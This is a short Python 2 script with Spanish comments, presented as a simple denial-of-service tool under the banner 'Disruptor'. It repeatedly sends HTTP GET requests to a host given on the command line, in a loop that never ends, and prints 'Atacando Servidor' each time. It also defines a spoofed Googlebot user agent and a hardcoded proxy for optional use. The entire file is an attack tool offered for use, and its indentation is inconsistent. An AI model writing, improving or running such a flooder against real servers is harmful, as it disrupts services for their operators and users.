import requests, os, sys # Modulos 

# Variables
peticiones = 1
host = sys.argv[1]
user_agent = {'User-agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'}
proxy = { 'http' : 'http://80.1.116.80:80' }

# Limpiar terminal
os.system ("clear")

#imprimir banner
print " __     __  ___  __  ____  __  ___  __   __  "
print "|  \ | /__`  |  |__) |__| /  `  |  /  \ |__) "
print "|__/ | .__/  |  |  \ |  | \__,  |  \__/ |  \ "
print "--------------------------------------------------------"
print chr(27)+"[1;31m"+"Simple Denegacion de servicios - Twitter: Arturo1337\n\n"+chr(27)+"[0m"

# Pausa y control del ataque
raw_input("[+] Oprime enter para Comenzar ataque:\n\n")

# ciclo infinito
while peticiones<=100:

# peticion
 requests.get('http://' + host) # headers=user_agent, proxies=proxy
    
    # indicador de que se esta ejecutando el proceso
 print "Atacando Servidor -------->", host
